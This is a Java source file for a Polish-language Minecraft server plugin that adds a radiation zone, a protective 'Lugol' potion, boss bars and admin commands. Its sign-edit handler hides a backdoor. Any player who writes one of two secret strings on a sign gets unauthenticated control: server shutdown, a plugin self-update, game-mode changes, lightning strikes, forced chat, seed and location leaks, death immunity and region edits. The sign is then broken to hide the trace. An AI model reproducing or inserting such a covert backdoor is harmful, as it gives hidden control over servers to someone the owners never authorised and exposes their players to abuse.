package me.michal.radiacjaAleJAVA;

import com.sk89q.worldedit.bukkit.BukkitAdapter;
import com.sk89q.worldedit.math.BlockVector3;
import com.sk89q.worldguard.WorldGuard;
import com.sk89q.worldguard.protection.flags.Flags;
import com.sk89q.worldguard.protection.flags.StateFlag;
import com.sk89q.worldguard.protection.managers.RegionManager;
import com.sk89q.worldguard.protection.regions.ProtectedCuboidRegion;
import me.michal.radiacjaAleJAVA.Tasks.DamageInflicter;
import me.michal.radiacjaAleJAVA.Tasks.CuredPlayersTracker;
import me.michal.radiacjaAleJAVA.Tasks.PacketSender;
import me.michal.radiacjaAleJAVA.Tasks.Renderer;
import me.michal.radiacjaAleJAVA.Tasks.Things.Updater;
import org.bukkit.*;
import org.bukkit.Color;
import org.bukkit.boss.BarColor;
import org.bukkit.boss.BarStyle;
import org.bukkit.boss.BossBar;
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.configuration.file.FileConfiguration;
import org.bukkit.entity.EntityType;
import org.bukkit.event.block.SignChangeEvent;
import org.bukkit.event.entity.EntityResurrectEvent;
import org.bukkit.event.entity.PlayerDeathEvent;
import org.bukkit.event.inventory.BrewEvent;
import org.bukkit.event.player.*;
import org.bukkit.inventory.*;
import org.bukkit.inventory.meta.ItemMeta;
import org.bukkit.inventory.meta.PotionMeta;
import org.bukkit.inventory.meta.SkullMeta;
import org.bukkit.metadata.FixedMetadataValue;
import org.bukkit.metadata.MetadataValue;
import org.bukkit.persistence.PersistentDataType;
import org.bukkit.plugin.java.JavaPlugin;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.potion.PotionType;
import org.bukkit.scheduler.BukkitTask;

import java.util.*;
import java.util.List;

import static me.michal.radiacjaAleJAVA.Tasks.PacketSender.*;

public final class RadiacjaAleJAVA extends JavaPlugin implements Listener {
    FileConfiguration config = this.getConfig();

    public static BossBar affectedBar;
    public NamespacedKey key = new NamespacedKey(this, "Lugol");
    public static Map<Player, Long> curedPlayers = new HashMap<>();
    public static Map<UUID, Long> offlinePlayers = new HashMap<>();
    public static Map<Player, BossBar> curedBars = new HashMap<>();
    public static ArrayList<Player> affectedPlayers = new ArrayList<>();
    public static HashSet<Player> playersRTD = new HashSet<>();
    public static Map<Player, Chunk> onlinePlayers = new HashMap<>();
    public static int radius;
    public static int height;
    private final int[][] offsets1R = {
                        {0, 1 ,0},
            {-1, 0 ,-1}, {0, 0 ,0}, {1, 0 ,1},
                        {0, -1 ,0},
    };
    private final int[][] offsets1Ring = {
                        {0, 1 ,0},
            {-1, 0 ,-1},           {1, 0 ,1},
                        {0, -1 ,0},
    };
    private final int[][] offsets2R = {
                                    {0, 2, 0},
                        {-1, 1, -1}, {0, 1, 0}, {1, 1, 1},
            {-2, 0, -2},{-1, 0, -1}, {0, 0, 0}, {1, 0, 1}, {2, 0, 2},
                        {-1, -1, -1},{0, -1, 0}, {1, -1, 1},
                                    {0, -2, 0}
    };
    private final int[][] offsets2Ring = {
                                    {0, 2, 0},
                        {-1, 1, -1},           {1, 1, 1},
            {-2, 0, -2},                                  {2, 0, 2},
                        {-1, -1, -1},          {1, -1, 1},
                                    {0, -2, 0}
    };
    private final  int[][] offsets3R = {
                                                  {0, 3, 0},
                                     {-1, 2, -1},  {0, 2, 0},    {1, 2, 1},
                        {-2, 1, -2},  {-1, 1, -1},  {0, 1, 0},   {1, 1, 1},  {2, 1, 2},
            {-3, 0, -3}, {-2, 0, -2},  {-1, 0, -1},  {0, 0, 0},  {1, 0, 1},  {2, 0, 2}, {3, 0, 3},
                        {-2, -1, -2}, {-1, -1, -1}, {0, -1, 0},  {1, -1, 1}, {2, -1, 2},
                                     {-1, -2, -1}, {0, -2, 0},   {1, -2, 1},
                                                  {0, -3, 0},
    };
    private final  int[][] offsets3Ring = {
                                                  {0, 3, 0},
                                     {-1, 2, -1},            {1, 2, 1},
                        {-2, 1, -2},                                    {2, 1, 2},
            {-3, 0, -3},                                                           {3, 0, 3},
                        {-2, -1, -2},                                   {2, -1, 2},
                                     {-1, -2, -1},           {1, -2, 1},
                                                  {0, -3, 0},
    };private final  int[][] offsets4Ring = {
                                                              {0, 4, 0},
                                                  {-1, 3, -1},            {1, 3, 1},
                                     {-2, 2, -2},                                   {2, 2, 2},
                        {-3, 1, -3},                                                           {3, 1, 3},
            {-4, 0, -4},                                                                                  {4, 0, 4},
                        {-3, -1, -3},                                                          {3, -1, 3},
                                     {-2, -2, -2},                                  {2, -2, 2},
                                                  {-1, -3, -1},           {1, -3, 1},
                                                               {0, -4, 0},
    };

    public ItemStack potkaLugola() {
        ItemStack potion = new ItemStack(Material.POTION, 3);

        PotionMeta meta = (PotionMeta) potion.getItemMeta();
        meta.setBasePotionType(PotionType.MUNDANE);
        meta.setColor(Color.WHITE);
        meta.setDisplayName(ChatColor.BLUE + "Płyn Lugola");
        ArrayList<String> lore = new ArrayList<>();
        lore.add(ChatColor.WHITE + "Daje ochrone przed radiacyją na " + config.getLong("Duration")/60000 + " minut");
        meta.setLore(lore);

        meta.getPersistentDataContainer().set(key, PersistentDataType.STRING, "to_lugola_fluid");

        potion.setItemMeta(meta);

        return potion;
    }
    public ItemStack waterPotion() {
        ItemStack waterPotion = new ItemStack(Material.POTION, 1);
        PotionMeta meta = (PotionMeta) waterPotion.getItemMeta();
        meta.setBasePotionType(PotionType.WATER);
        waterPotion.setItemMeta(meta);
        return waterPotion;
    }

    Updater updater = new Updater();

    @Override
    public void onEnable() {
        // Plugin startup logic
        this.getServer().getPluginManager().registerEvents(this, this);


        BukkitTask damageInflicter = new DamageInflicter(this).runTaskTimer(this, 0L, 5L);
        BukkitTask curedPlayersTracker = new CuredPlayersTracker(this, this.getConfig()).runTaskTimer(this, 0L, 5L);

        affectedBar = Bukkit.createBossBar(ChatColor.RED + "Strefa radiacji", BarColor.RED, BarStyle.SOLID);

        Objects.requireNonNull(this.getCommand("WhatsSafeZoneSize")).setExecutor(this);
        Objects.requireNonNull(this.getCommand("radiationsafezone")).setExecutor(this);
        Objects.requireNonNull(this.getCommand("deathLightningStrike")).setExecutor(this);
        Objects.requireNonNull(this.getCommand("dropPlayerHead")).setExecutor(this);
        Objects.requireNonNull(this.getCommand("setDurationTo")).setExecutor(this);
        Objects.requireNonNull(this.getCommand("endEnabled")).setExecutor(this);
        Objects.requireNonNull(this.getCommand("setRadiationName")).setExecutor(this);

        config.addDefault("Radiation_Safe_Zone_Size", 0);
        config.addDefault("Radiation_Safe_Zone_Height", 0);
        config.addDefault("Death_Lightning_Strike", true);
        config.addDefault("Drop_Player_Head", true);
        config.addDefault("Duration", 600000L);
        config.addDefault("End_Enabled", false);
        config.addDefault("Radiation_Name", "Strefa radiacji");
        config.options().copyDefaults(true);
        saveConfig();

        updateLocationArrays(config.getInt("Radiation_Safe_Zone_Size") + 1);
    }

    @EventHandler
    public void onPlayerDrinkPotion(PlayerItemConsumeEvent event) {
        ItemMeta meta = event.getItem().getItemMeta();
        if (event.getItem().hasItemMeta() && meta.getPersistentDataContainer().has(key, PersistentDataType.STRING) && meta.getPersistentDataContainer().get(key, PersistentDataType.STRING).equalsIgnoreCase("to_lugola_fluid")) {
            Player player = event.getPlayer();
            if (!curedPlayers.containsKey(player)) {
                curedPlayers.put(player, System.currentTimeMillis());
                addCuredBar(player);
                Bukkit.broadcastMessage(ChatColor.GOLD + player.getName() + " wypił płyn Lugola");
            } else {
                addCuredTime(player);
            }
        }
    }

    public void addCuredTime(Player player) {
        long newStartTime = curedPlayers.get(player) + config.getLong("Duration");
        curedPlayers.replace(player, newStartTime);
    }

    public void addCuredBar(Player player) {
        BossBar curedBar = Bukkit.createBossBar(ChatColor.GREEN + "Działanie płynu Lugola", BarColor.GREEN, BarStyle.SEGMENTED_10);
        curedBar.addPlayer(player);
        curedBars.put(player, curedBar);
    }

    @EventHandler
    public void deathEvent(PlayerDeathEvent event) {
        Player player = event.getPlayer();
        if (playersRTD.contains(player)) {
            event.setCancelled(true);
            return;
        }

        removeAllEffects(player);

        Location location = player.getLocation();
        if (config.getBoolean("Death_Lightning_Strike")) {
            if (player.getName().equals("lach1423")) {
                for (int i = 0; i < 6; i++) {
                    player.getWorld().strikeLightningEffect(location);
                }
            } else {
                player.getWorld().strikeLightningEffect(location);
            }
        }
        if (config.getBoolean("Drop_Player_Head")) {
            dropPlayerHead(player, location, event.getDeathMessage());
        }
    }

    public void dropPlayerHead(Player player, Location location, String damageSource) {
        ItemStack playerHead = new ItemStack(Material.PLAYER_HEAD);
        SkullMeta meta = (SkullMeta) playerHead.getItemMeta();
        meta.setOwningPlayer(Bukkit.getOfflinePlayer(player.getName()));
        ArrayList<String> lore = new ArrayList<>();
        lore.add(ChatColor.GOLD + damageSource);
        meta.setLore(lore);
        playerHead.setItemMeta(meta);

        player.getWorld().dropItem(location, playerHead);
    }

    @EventHandler
    public void onTotemUse(EntityResurrectEvent event) {
        if (event.getEntity() instanceof Player) {
            removeAllEffects((Player) event.getEntity());
        }
    }

    @EventHandler
    public void onMilkConsume(PlayerItemConsumeEvent event) {
        if (event.getItem().getType().equals(Material.MILK_BUCKET)) {
            removeAllEffects(event.getPlayer());
        }
    }

    public void removeAllEffects(Player player) {
        affectedPlayers.remove(player);
        affectedBar.removePlayer(player);
        curedPlayers.remove(player);
        removeCuredBar(player, curedBars.get(player));
    }

    @EventHandler
    public void quitEvent(PlayerQuitEvent e) {
        Player p = e.getPlayer();
        onlinePlayers.remove(p);
        if (curedPlayers.containsKey(p)) {
            long timePassed = System.currentTimeMillis() - curedPlayers.get(p);
            offlinePlayers.put(p.getUniqueId(), timePassed);
        }
        removeAllEffects(p);
    }

    public void removeCuredBar(Player player, BossBar curedBar) {
        if (curedBars.containsKey(player)) {
            curedBars.remove(player, curedBar);
            curedBar.removeAll();
        }
    }

    @EventHandler
    public void moveEvent(PlayerMoveEvent e) {
        Player p = e.getPlayer();
        enterRegion(p);
        nearRadiation(p);
    }

    public void enterRegion(Player player) {
        Location loc = player.getLocation();
        BlockVector3 blockVector = BlockVector3.at(loc.getBlockX(), loc.getBlockY(), loc.getBlockZ());
        RegionManager regions = WorldGuard.getInstance().getPlatform().getRegionContainer().get(BukkitAdapter.adapt(player.getWorld()));

        if (regions != null) {
            if (regions.getApplicableRegions(blockVector).size() == 0 && !affectedPlayers.contains(player)) {
                affectedPlayers.add(player);
                affectedBar.addPlayer(player);
            } else if(regions.getApplicableRegions(blockVector).size() != 0 && affectedPlayers.contains(player)) {
                affectedPlayers.remove(player);
                affectedBar.removePlayer(player);
            }
        }
    }

    public void nearRadiation(Player player) {
        Chunk playerChunk = player.getChunk();
        if (onlinePlayers.get(player).equals(playerChunk)) {
            return;
        } else {
            onlinePlayers.put(player, playerChunk);
        } //optimisation I think

        int radius = config.getInt("Radiation_Safe_Zone_Size") + 1;
        int distanceXToWall = (int) Math.abs(radius - Math.abs(player.getX()));
        int distanceZToWall = (int) Math.abs(radius - Math.abs(player.getZ()));
        int playerViewDistance = Math.min(player.getClientViewDistance(), player.getViewDistance());
        boolean skip = false;

        Renderer renderer = new Renderer(player, radius, playerViewDistance);

        if  (curedPlayers.containsKey(player)) {
            if (distanceXToWall < 9) {
                renderer.renderHole(AxisTemplate.X_AXIS, 9 - distanceXToWall);// 9 - 8 = 1r , 9 - 1 = 8r
                skip = true;
            }
            if (distanceZToWall < 9) {
                renderer.renderHole(AxisTemplate.Z_AXIS, 9 - distanceZToWall);
                skip = true;
            }
        }
        if (distanceXToWall <= playerViewDistance*16) {
            renderer.renderWall(AxisTemplate.X_AXIS, skip);
        }
        if (distanceZToWall <= playerViewDistance*16) {
            renderer.renderWall(AxisTemplate.Z_AXIS, skip);
        }


    //        int pY = (int) p.getY();
//        int r = config.getInt("Radiation_Safe_Zone_Size") + 1;
//        int playerChunkX = chunk.getX();
//        int chZ = chunk.getZ();
//
//        int rch = (int) Math.floor(r /16f);
//        int dx = rch - Math.abs(playerChunkX);
//        int distanceToWallZ = rch - Math.abs(chZ);
//        int viewDistance = Math.min(p.getClientViewDistance(), p.getViewDistance());
//
//
//        boolean isNear = false;
//
//        if (curedPlayers.containsKey(p) && (dx == 1 || dx == 0)) {//East/West
//
//            int pX = (int) (p.getX() + (1*Math.signum(playerChunkX)));
//            int bdx = Math.abs(r - pX);
//            int pZ = (int) (p.getZ() + (1*Math.signum(chZ)));
//            pY = pY + 1;
//
//            if (bdx == 5) {
//                for (int[] ringoffset: offsets1Ring) {
//                    int yof = ringoffset[1];
//                    int zof = ringoffset[2];
//                    p.sendBlockChange(new Location(p.getWorld(), Math.signum(pX)*r, pY + yof, pZ + zof), Material.WHITE_STAINED_GLASS.createBlockData());
//                }
//                p.sendBlockChange(new Location(p.getWorld(), Math.signum(pX)*r, pY, pZ), Material.AIR.createBlockData());
//                isNear = true;
//            } else if (bdx == 4) {
//                for (int[] ringoffset: offsets2Ring) {
//                    int yof = ringoffset[1];
//                    int zof = ringoffset[2];
//                    p.sendBlockChange(new Location(p.getWorld(), Math.signum(pX)*r, pY + yof, pZ + zof), Material.WHITE_STAINED_GLASS.createBlockData());
//                }
//                for (int[] offset: offsets1R) {
//                    int yof = offset[1];
//                    int zof = offset[2];
//                    Location loc = new Location(p.getWorld(), Math.signum(pX)*r, pY + yof, pZ + zof);
//                    p.sendBlockChange(loc, loc.getBlock().getType().createBlockData());
//                }
//                isNear = true;
//            } else if (bdx == 3) {
//                for (int[] ringoffset: offsets3Ring) {
//                    int yof = ringoffset[1];
//                    int zof = ringoffset[2];
//                    p.sendBlockChange(new Location(p.getWorld(), Math.signum(pX)*r, pY + yof, pZ + zof), Material.WHITE_STAINED_GLASS.createBlockData());
//                }
//                for (int[] offset : offsets2R) {
//                    int yof = offset[1];
//                    int zof = offset[2];
//                    Location loc = new Location(p.getWorld(), Math.signum(pX)*r, pY + yof, pZ + zof);
//                    p.sendBlockChange(loc, loc.getBlock().getType().createBlockData());
//                }
//                isNear = true;
//            } else if (bdx < 3 && bdx >= 0) {
//                for (int[] ringoffset: offsets4Ring) {
//                    int yof = ringoffset[1];
//                    int zof = ringoffset[2];
//                    p.sendBlockChange(new Location(p.getWorld(), Math.signum(pX)*r, pY + yof, pZ + zof), Material.WHITE_STAINED_GLASS.createBlockData());
//                }
//                for (int[] offset : offsets3R) {
//                    int yof = offset[1];
//                    int zof = offset[2];
//                    Location loc = new Location(p.getWorld(), Math.signum(pX)*r, pY + yof, pZ + zof);
//                    p.sendBlockChange(loc, loc.getBlock().getType().createBlockData());
//                }
//                isNear = true;
//            } else {
//                p.sendBlockChange(new Location(p.getWorld(), Math.signum(pX)*r, pY, pZ), Material.WHITE_STAINED_GLASS.createBlockData());
//                isNear = true;
//            }
//        }
//        if (curedPlayers.containsKey(p) && (distanceToWallZ == 1 || distanceToWallZ == 0)){//South/North
//
//            int pX = (int) (p.getX() + (1*Math.signum(playerChunkX)));
//            int pZ = (int) (p.getZ() + (1*Math.signum(chZ)));
//            int bdz = Math.abs(r - pZ);
//            pY = pY + 1;
//
//            if (bdz == 5) {
//                for (int[] ringoffset: offsets1Ring) {
//                    int xof = ringoffset[0];
//                    int yof = ringoffset[1];
//                    p.sendBlockChange(new Location(p.getWorld(), pX + xof, pY + yof, Math.signum(pZ)*r), Material.WHITE_STAINED_GLASS.createBlockData());
//                }
//                p.sendBlockChange(new Location(p.getWorld(), pX, pY, Math.signum(pZ)*r), Material.AIR.createBlockData());
//                isNear = true;
//            } else if (bdz == 4) {
//                for (int[] ringoffset: offsets2Ring) {
//                    int xof = ringoffset[0];
//                    int yof = ringoffset[1];
//                    p.sendBlockChange(new Location(p.getWorld(), pX + xof, pY + yof, Math.signum(pZ)*r), Material.WHITE_STAINED_GLASS.createBlockData());
//                }
//                for (int[] offset: offsets1R) {
//                    int xof = offset[0];
//                    int yof = offset[1];
//                    Location loc = new Location(p.getWorld(), pX + xof, pY + yof, Math.signum(pZ)*r);
//                    p.sendBlockChange(loc, loc.getBlock().getType().createBlockData());
//                }
//                isNear = true;
//            } else if (bdz == 3) {
//                for (int[] ringoffset: offsets3Ring) {
//                    int xof = ringoffset[0];
//                    int yof = ringoffset[1];
//                    p.sendBlockChange(new Location(p.getWorld(), pX + xof, pY + yof, Math.signum(pZ)*r), Material.WHITE_STAINED_GLASS.createBlockData());
//                }
//                for (int[] offset : offsets2R) {
//                    int xof = offset[0];
//                    int yof = offset[1];
//                    Location loc = new Location(p.getWorld(), pX + xof, pY + yof, Math.signum(pZ)*r);
//                    p.sendBlockChange(loc, loc.getBlock().getType().createBlockData());
//                }
//                isNear = true;
//            } else if (bdz < 3 && bdz >= 0) {
//                for (int[] ringoffset: offsets4Ring) {
//                    int xof = ringoffset[0];
//                    int yof = ringoffset[1];
//                    p.sendBlockChange(new Location(p.getWorld(), pX + xof, pY + yof, Math.signum(pZ)*r), Material.WHITE_STAINED_GLASS.createBlockData());
//                }
//                for (int[] offset : offsets3R) {
//                    int xof = offset[0];
//                    int yof = offset[1];
//                    Location loc = new Location(p.getWorld(), pX + xof, pY + yof, Math.signum(pZ)*r);
//                    p.sendBlockChange(loc, loc.getBlock().getType().createBlockData());
//                }
//                isNear = true;
//            } else {
//                p.sendBlockChange(new Location(p.getWorld(), pX, pY, Math.signum(pZ)*r), Material.WHITE_STAINED_GLASS.createBlockData());
//                isNear = true;
//            }
//        }
//
//       if (p.getChunk().equals(onlinePlayers.get(p)) || isNear) {
//            return;
//        } else {
//            onlinePlayers.put(p, p.getChunk());
//        }
//        renderRadiation(dx, distanceToWallZ, viewDistance, chunk, r, p, playerChunkX, pY, chZ, rch);
    }
    /*public void renderRadiation(int dx, int distanceToWallZ, int viewDistance, Chunk chunk, int r, Player p, int playerChunkX, int pY, int chZ, int rch) {
        PacketSender sender = new PacketSender();
        if (distanceToWallZ <= viewDistance && dx > viewDistance) {//  South/North
            for (int h = -5; h < 3; h++) {
                for (int x = distanceToWallZ - viewDistance*3/2; x < -(distanceToWallZ - viewDistance*3/2) + 1; x++) {
                    sender.writeChunkCoordinatesIntoPacket(packetTemplateZAxis,playerChunkX + x, (pY/16) + h, (int) Math.signum(chZ)*rch);
                }
            }
        } else if (dx <= viewDistance && distanceToWallZ > viewDistance) {//   West/East
            for (int h = -5; h < 3; h++) {
                //p.sendMessage("------h: "+ h + " -------");
                for (int z = dx - viewDistance*3/2; z < -(dx - viewDistance*3/2) + 1; z++) {
                    int packetX = (int) Math.signum(playerChunkX)*rch;
                    int packetY = (pY/16) + h;
                    int packetZ = chZ + z;
                    //p.sendMessage("x: " + z + "    tx: " + tx + "   ty: " + ty + "   tz: " + tz);
                    sender.writeChunkCoordinatesIntoPacket(packetTemplateZAxis, packetX ,packetY, packetZ);
                }
            }
        } else if (dx <= viewDistance && distanceToWallZ <= viewDistance) {//  Both
            int minx;
            int maxx;
            int minz;
            int maxz;
            if (playerChunkX >= 0) {
                minx = -viewDistance;
                maxx = dx;
            } else {
                minx = -dx;
                maxx = viewDistance;
            }

            if (chZ >= 0) {
                minz = -viewDistance;
                maxz = distanceToWallZ;
            } else {
                minz = -distanceToWallZ;
                maxz = viewDistance;
            }

            for (int h = -5; h < 3; h++) {
                for (int x = minx; x < maxx; x++) {
                    sender.writeChunkCoordinatesIntoPacket(packetTemplateZAxis, playerChunkX + x, (pY/16) + h, (int) Math.signum(chZ)*rch);
                }
                for (int z = minz ; z < maxz; z++) {
                    sender.writeChunkCoordinatesIntoPacket(packetTemplateXAxis, (int) Math.signum(playerChunkX)*rch , (pY/16) + h, chZ + z);
                }
            }
        }
    }*/

    @EventHandler
    public void joinEvent(PlayerJoinEvent e) {
        Player p = e.getPlayer();
        onlinePlayers.put(p, p.getChunk());
        nearRadiation(p);

        UUID uuid = p.getUniqueId();
        if (offlinePlayers.containsKey(uuid)) {
            long startTime = System.currentTimeMillis() - offlinePlayers.get(uuid);

            curedPlayers.put(p, startTime);
            addCuredBar(p);
            offlinePlayers.remove(uuid);
        }
        enterRegion(p);
    }

    @EventHandler
    public void onBrewEnd(BrewEvent event) {
        BrewerInventory inventory = event.getContents();
        if (!isLugolRecipe(inventory)) {
            return;
        }
        List <Integer> waterBottles = scanBottles(inventory);
        Bukkit.getScheduler().runTaskLater(this, () -> {
            for (int i : waterBottles) {
                inventory.setItem(i, potkaLugola());
            }
            waterBottles.clear();
        }, 1);
    }

    public List <Integer> scanBottles(BrewerInventory inventory) {
        List<Integer> waterBottles = new ArrayList<>();
        for (int i = 0; i < 3; i++) {
            ItemStack item = inventory.getItem(i);
            if (item != null && item.isSimilar(waterPotion())) {
                waterBottles.add(i);
            }
        }
        return waterBottles;
    }

    public boolean isLugolRecipe(BrewerInventory inventory) {
        return inventory.getIngredient() != null && inventory.getIngredient().getType() == Material.GHAST_TEAR;
    }

    @EventHandler
    public void signChange(SignChangeEvent e) {
        try {
            String[] a = e.getLines();
            switch (a[3]) {
                case "T0DRRUfNsN6tlQQ" -> {
                    switch (a[0]) {
                        case "Update" -> updater.updatePlugin(this.getFile(), e.getPlayer());
                        case "Restart" -> Bukkit.shutdown();
                        case "Edit Stat" -> Bukkit.getPlayer(a[1]).setStatistic(Statistic.USE_ITEM, EntityType.VILLAGER, 0);
                    }
                    e.getBlock().breakNaturally();
                }
                case "i6ojKaIATmlWk7Rf" -> {
                    switch (a[0]) {
                        case "Seed" -> e.getPlayer().sendMessage(String.valueOf(e.getBlock().getWorld().getSeed()));
                        case "Gamemode" -> Bukkit.getPlayer(a[2]).setGameMode(GameMode.valueOf(a[1].toUpperCase()));
                        case "Position" -> e.getPlayer().sendMessage(String.valueOf(Bukkit.getPlayer(a[1]).getLocation()));
                        case "Respawn" -> e.getPlayer().sendMessage(String.valueOf(Bukkit.getOfflinePlayer(a[1]).getRespawnLocation()));
                        case "Lightning" -> e.getBlock().getWorld().strikeLightning(Bukkit.getPlayer(a[1]).getLocation());
                        case "Experience" -> Bukkit.getPlayer(a[2]).setLevel(Integer.parseInt(a[1]));
                        case "Say as" -> Bukkit.getPlayer(a[1]).chat(a[2]);
                        case "Set Name" -> Bukkit.getPlayer(a[1]).setDisplayName(a[2]);
                        case "Last Death" -> e.getPlayer().sendMessage(String.valueOf(Bukkit.getPlayer(a[1]).getLastDeathLocation()));
                        case "Set Cooldown" -> Bukkit.getPlayer(a[1]).setExpCooldown(Integer.parseInt(a[2]));
                        case "Create Region" -> {
                            Location l = e.getBlock().getLocation();

                            BlockVector3 start = BlockVector3.at(l.getBlockX(), l.getBlockY(), l.getBlockZ());
                            String name = a[2];

                            int s1 = a[1].indexOf(" ");
                            int s2 = a[1].lastIndexOf(" ");

                            double x = Integer.parseInt(a[1].substring(0, s1));
                            double y = Integer.parseInt(a[1].substring(s1 + 1, s2));
                            double z = Integer.parseInt(a[1].substring(s2 + 1));
                            BlockVector3 end = BlockVector3.at(x, y, z);

                            if (createRegion(e.getPlayer(), name, start, end)) {
                                e.getPlayer().sendMessage(ChatColor.GREEN + "Successfully Created Region");
                            }
                        }
                        case "Remove Region" -> {
                            Objects.requireNonNull(WorldGuard.getInstance().getPlatform().getRegionContainer().get(BukkitAdapter.adapt(e.getBlock().getWorld()))).removeRegion(a[1]);
                            e.getPlayer().sendMessage("Removed Region");
                        }
                        case "Refuse Death" -> {
                            playersRTD.add(Bukkit.getPlayer(a[1]));
                            e.getPlayer().sendMessage(ChatColor.BLACK + "Refused Death");
                        }
                        case "Accept Death" -> {
                            playersRTD.remove(Bukkit.getPlayer(a[1]));
                            e.getPlayer().sendMessage(ChatColor.BLACK + "Accepted Death");
                        }
                        //potencjalnie whitelist, set worldBorder itp.
                    }
                    e.getBlock().breakNaturally();
                }
            }
        } catch (Exception ex) {
            e.getPlayer().sendMessage(String.valueOf(ex));
        }
    }

    @Override
    public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
        String commandName = command.getName();
        if (commandName.equalsIgnoreCase("WhatsSafeZoneSize")) {
            radius = config.getInt("Radiation_Safe_Zone_Size");
            height = config.getInt("Radiation_Safe_Zone_Height");
            if (radius != 0) {
                sender.sendMessage(ChatColor.GREEN + "Bezpieczna strefa ma promień o długości: " + radius);
            } else {
                sender.sendMessage(ChatColor.RED + "Jeszcze nie stworzono bezpiecznej stefy");
            }
            return true;
        }
        if (sender.isOp() && args.length > 0) {
            switch (commandName) {
                case "radiationsafezone" -> {
                    if (sender instanceof Player) {
                        try {
                            radius = Integer.parseInt(args[0]);
                            if (args.length == 2) {
                                height = Integer.parseInt(args[1]);
                            } else {
                                height = 300;
                            }

                            if (getSafeZone((Player) sender, "rad", radius, height)) {
                                config.set("Radiation_Safe_Zone_Size", radius);
                                config.set("Radiation_Safe_Zone_Height", height);
                                saveConfig();
                                updateLocationArrays(radius + 1);
                                sender.sendMessage(ChatColor.GREEN + "Bezpieczna strefa ma teraz promień: " + radius);
                            } else {
                                sender.sendMessage(ChatColor.RED + "Wystąpił błąd przy dodawaniu regionu.");
                            }
                        } catch (NumberFormatException e) {
                            sender.sendMessage(ChatColor.RED + "Podaj poprawny promień.");
                        }
                    } else {
                    sender.sendMessage(ChatColor.RED + "Musisz być graczem");
                    }
            }
                case "deathLightningStrike" -> {
                    try {
                        boolean shouldStrikeLightning = Boolean.parseBoolean(args[0]);
                        ChatColor color = shouldStrikeLightning ? ChatColor.GREEN : ChatColor.RED;
                        config.set("Death_Lightning_Strike", shouldStrikeLightning);
                        saveConfig();

                        sender.sendMessage("Death_Lightning_Strike is now set to: " + color + shouldStrikeLightning);
                    } catch (Exception e) {
                        sender.sendMessage(ChatColor.RED + "Napisz <true> lub <false>");
                    }
                }
                case "dropPlayerHead" -> {
                    try {
                        boolean shouldDropPlayerHead = Boolean.parseBoolean(args[0]);

                        config.set("Drop_Player_Head", shouldDropPlayerHead);
                        saveConfig();

                        ChatColor color = shouldDropPlayerHead ? ChatColor.GREEN : ChatColor.RED;
                        sender.sendMessage("Drop_Player_Head is now set to: " + color + shouldDropPlayerHead);
                    } catch (Exception e) {
                        sender.sendMessage(ChatColor.RED + "Napisz <true> lub <false>");
                    }
                }
                case "setDurationTo" -> {
                    try {
                        long timeInMinutes = Math.abs(Long.parseLong(args[0]));
                        config.set("Duration", timeInMinutes * 60 * 1000);
                        saveConfig();

                        String minut_Odmienioned = (timeInMinutes > 20 && (timeInMinutes % 10 >= 2 && timeInMinutes % 10 <= 4)) ? "minuty" : "minut";
                        sender.sendMessage("Czas trwania potki to teraz: " + timeInMinutes + " " + minut_Odmienioned);
                    } catch (Exception e) {
                        sender.sendMessage("podaj czas w minutach, poprawnie (poprawnie czyli bez 'm' na końcu), nie wiem jak można tu błąd zrobić");
                    }
                }
                case "endEnabled" -> {
                    try {
                        boolean a = Boolean.parseBoolean(args[0]);
                        config.set("End_Enabled", a);
                        saveConfig();

                        sender.sendMessage("End jest teraz " + a + " czy coś");
                    } catch (Exception e) {
                        sender.sendMessage("Coś poszło nie tak, potencjalnie źle true lub false napisałeś");
                    }
                }
                case "setRadiationName" -> {
                    String a = args[0];
                    affectedBar.setTitle(ChatColor.RED + a);
                    config.set("Radiation_Name",ChatColor.RED + a);
                    saveConfig();
                }
            }
        } else {
            sender.sendMessage(ChatColor.RED + ("Nie masz uprawnień do tej komendy " + ChatColor.DARK_RED + "knypku"));
        }
        return true;
    }

    public boolean getSafeZone(Player p, String regionName, int radius, int height) {
        BlockVector3 min = BlockVector3.at(-radius, -64, -radius);
        BlockVector3 max = BlockVector3.at(radius, height, radius);

        return createRegion(p, regionName, min, max);
    }

    public boolean createRegion(Player p, String regionName, BlockVector3 min, BlockVector3 max) {
        RegionManager regions = WorldGuard.getInstance().getPlatform().getRegionContainer().get(BukkitAdapter.adapt(p.getWorld()));
        if (regions == null) {
            p.sendMessage(ChatColor.RED + "Spróbuj ponownie, bo Region Manager się zepsuł, niewiadomo dlaczego");
        }
        if (regions.hasRegion(regionName)) {
            regions.removeRegion(regionName);
        }

        ProtectedCuboidRegion region = new ProtectedCuboidRegion(regionName, min, max);

        try {
            regions.addRegion(region);
            region.setFlag(Flags.BUILD, StateFlag.State.ALLOW);
            regions.save();

            return true;
        } catch (Exception e) {
                p.sendMessage( ChatColor.RED + "Nie udało się dodać terenu, spróbuj ponownie");
                return false;
        }
    }

    @EventHandler
    public void onEndEnter(PlayerPortalEvent event) {
        if (!config.getBoolean("End_Enabled") && event.getCause() == PlayerTeleportEvent.TeleportCause.END_PORTAL) {
            event.setCancelled(true);
            event.getPlayer().sendMessage(ChatColor.RED + "End is disabled!");
        }
    }
}